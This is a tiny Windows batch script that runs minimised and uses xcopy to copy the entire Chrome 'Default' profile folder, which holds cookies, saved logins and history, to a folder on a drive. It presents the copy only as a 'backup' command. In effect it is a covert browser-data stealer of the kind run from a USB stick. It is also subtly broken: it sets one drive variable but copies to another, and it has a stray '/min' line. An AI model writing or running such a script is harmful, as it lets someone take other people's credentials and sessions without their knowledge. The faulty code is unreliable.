@echo off
:: variables
/min
SET odrive=%odrive:~0,2%
set backupcmd=xcopy /E /C
%backupcmd% "%USERPROFILE%\AppData\Local\Google\Chrome\User Data\Default\*.*" "%drive%\a\"
@echo off